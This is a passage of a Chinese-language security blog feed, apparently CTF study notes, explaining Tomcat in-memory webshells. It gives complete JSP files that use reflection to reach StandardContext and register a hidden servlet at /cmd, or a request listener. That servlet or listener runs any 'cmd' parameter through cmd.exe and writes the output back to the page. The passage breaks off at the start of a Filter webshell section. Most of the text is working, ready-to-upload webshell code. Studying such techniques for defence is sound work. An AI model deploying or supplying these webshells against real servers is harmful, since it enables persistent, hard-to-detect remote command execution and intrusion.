class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                res.getWriter().println(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先从<code>request</code>对象获取<code>ServletContext</code>，再从<code>ServletContext</code>获取<code>ApplicationContext</code>，最后从<code>ApplicationContext</code>获取<code>StandardContext</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        </span><br><span class="line">Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br></pre></td></tr></table></figure><p>将恶意<code>Servlet</code>包装并传入<code>trueStandardContext</code>中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> trueStandardContext.createWrapper();</span><br><span class="line">wrapper.setName(<span class="string">&quot;CmdServlet&quot;</span>);</span><br><span class="line">wrapper.setServletClass(CmdServlet.class.getName());</span><br><span class="line">wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">CmdServlet</span>());</span><br><span class="line"></span><br><span class="line">trueStandardContext.addChild(wrapper);</span><br><span class="line">trueStandardContext.addServletMappingDecoded(<span class="string">&quot;/cmd&quot;</span>,<span class="string">&quot;CmdServlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">response.getWriter().println(<span class="string">&quot;success&quot;</span>);</span><br></pre></td></tr></table></figure><p>完整的jsp内存马</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CmdServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                res.getWriter().println(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> trueStandardContext.createWrapper();</span><br><span class="line">        wrapper.setName(<span class="string">&quot;CmdServlet&quot;</span>);</span><br><span class="line">        wrapper.setServletClass(CmdServlet.class.getName());</span><br><span class="line">        wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">CmdServlet</span>());</span><br><span class="line"></span><br><span class="line">        trueStandardContext.addChild(wrapper);</span><br><span class="line">        trueStandardContext.addServletMappingDecoded(<span class="string">&quot;/cmd&quot;</span>,<span class="string">&quot;CmdServlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">        response.getWriter().println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传成功后，访问jsp文件，之后访问<code>/cmd</code>路由即可通过<code>cmd</code>参数进行RCE</p><p><img src="/img/post/image-20260106163437259.png" alt="image-20260106163437259"></p><br/><h1 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h1><p>类似的，Listener也是通过动态注册监听器进行恶意命令的执行</p><h2 id="Listener监听器"><a href="#Listener监听器" class="headerlink" title="Listener监听器"></a>Listener监听器</h2><p>Listener是JavaEE的一种规范接口，当某些事件发生时监听器被执行</p><table><thead><tr><th align="left">监听器类型</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">ServletRequestListener</td><td align="left">监听request作用域的创建和销毁</td></tr><tr><td align="left">ServletRequestAttributeListener</td><td align="left">监听request作用域的属性状态变化</td></tr><tr><td align="left">HttpSessionListener</td><td align="left">监听session作用域的创建和销毁</td></tr><tr><td align="left">HttpSessionAttributeListener</td><td align="left">监听session作用域的属性状态变化</td></tr><tr><td align="left">ServletContextListener</td><td align="left">监听application作用域的创建和销毁</td></tr><tr><td align="left">ServletContextAttributeListener</td><td align="left">监听application作用域的属性状态变化</td></tr><tr><td align="left">HttpSessionBindingListener</td><td align="left">监听对象与session的绑定和解除</td></tr><tr><td align="left">HttpSessionActivationListener</td><td align="left">监听session数值的钝化和活化</td></tr></tbody></table><p>其中，<code>ServletRequestListener</code>在request作用域的创建和销毁时都会被触发，即每次请求都会触发 </p><p>通过实现<code>ServletRequestListener</code>接口并重写<code>requestInitialized()</code>编写Listener</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逆向Listener注册"><a href="#逆向Listener注册" class="headerlink" title="逆向Listener注册"></a>逆向Listener注册</h2><p><code>StandardContext</code>类中的<code>fireRequestInitEvent()</code>方法调用了<code>listener</code>，<code>listener</code>由上方的<code>instance</code>而来，<code>instance</code>又是从<code>instances</code>数组遍历而来的，<code>instances</code>数组通过<code>this.getApplicationEventListeners()</code>获取</p><p><img src="/img/post/image-20260106170459293.png" alt="image-20260106170459293"></p><p><code>getApplicationEventListeners()</code>返回了<code>StandardContext</code>中的<code>applicationEventListenersList</code>字段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.applicationEventListenersList.toArray();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很明显，通过修改<code>applicationEventListenersList</code>字段使其包含我们的恶意Listener即可，其中<code>addApplicationEventListener()</code>方法可以帮助我们插入恶意监听器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.applicationEventListenersList.add(listener);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="构建Listener内存马"><a href="#构建Listener内存马" class="headerlink" title="构建Listener内存马"></a>构建Listener内存马</h2><p>构造恶意Listener</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取<code>StandardContext</code>，注入恶意监听器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line"></span><br><span class="line">trueStandardContext.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">Listener</span>());</span><br></pre></td></tr></table></figure><p>完整的jsp内存马文件</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line"></span><br><span class="line">        trueStandardContext.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">Listener</span>());</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>访问jsp文件后任意页面传入cmd参数即可触发</p><h2 id="Listener内存马回显"><a href="#Listener内存马回显" class="headerlink" title="Listener内存马回显"></a>Listener内存马回显</h2><p>在Listener的<code>requestInitialized()</code>方法中，我们能调用的就只有一个<code>ServletRequestEvent</code>对象，该对象下持有一个<code>request</code>对象，故我们可以很方便地获取<code>Request</code>实例</p><p><img src="/img/post/image-20260106174129102.png" alt="image-20260106174129102"></p><p>但是要让页面回显需要获取<code>Response</code>对象，而<code>Request</code>对象内部持有<code>Response</code>对象的引用</p><p><img src="/img/post/image-20260106174341429.png" alt="image-20260106174341429"></p><p>通过反射可以获取它</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; sreClass = sre.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">requestFacadeField</span> <span class="operator">=</span> sreClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestFacadeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) requestFacadeField.get(sre);</span><br><span class="line">Class&lt;?&gt; requestFacadeClass = requestFacade.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> requestFacadeClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">Class&lt;?&gt; requestClass = request.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">responseField</span> <span class="operator">=</span> requestClass.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">responseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) responseField.get(request);</span><br></pre></td></tr></table></figure><p>完整的jsp内存马文件</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; sreClass = sre.getClass();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestFacadeField</span> <span class="operator">=</span> sreClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestFacadeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) requestFacadeField.get(sre);</span><br><span class="line">                Class&lt;?&gt; requestFacadeClass = requestFacade.getClass();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> requestFacadeClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">                Class&lt;?&gt; requestClass = request.getClass();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">responseField</span> <span class="operator">=</span> requestClass.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                responseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) responseField.get(request);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    ProcessBuilder processBuilder;</span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                        String line;</span><br><span class="line">                        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                            output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                    response.getWriter().println(output);</span><br><span class="line">                &#125;</span><br><span class="line">                ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line"></span><br><span class="line">        trueStandardContext.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">Listener</span>());</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>测试可以发现命令结果直接打印在了现有页面上</p><p><img src="/img/post/image-20260106180605743.png" alt="image-20260106180605743"></p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Filter内存马简析</title>
      <link href="/2026/01/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E6%9E%90/"/>
      <url>/2026/01/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h1><p>Filter内存马通过向服务器后端注册恶意的过滤器以实现任意命令执行</p><h2 id="Filter过滤器"><a href="#Filter过滤器" class="headerlink" title="Filter过滤器"></a>Filter过滤器</h2><p>正常情况下可以通过继承<code>HttpFilter</code>类并重写父类的<code>doFilter()</code>方法并通过<code>web.xml</code>文件配置实现一个过滤器</p><p>编写一个过滤器，功能是在识别具有<code>cmd</code>参数时向页面打印参数内容</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            res.setContentType(<span class="string">&quot;text/html; charset=utf-8&quot;</span>);</span><br><span class="line">            res.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            res.getWriter().println(<span class="string">&quot;cmd=&quot;</span>+cmd);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>.doFilter(req, res, chain);</span><br><span class="line">        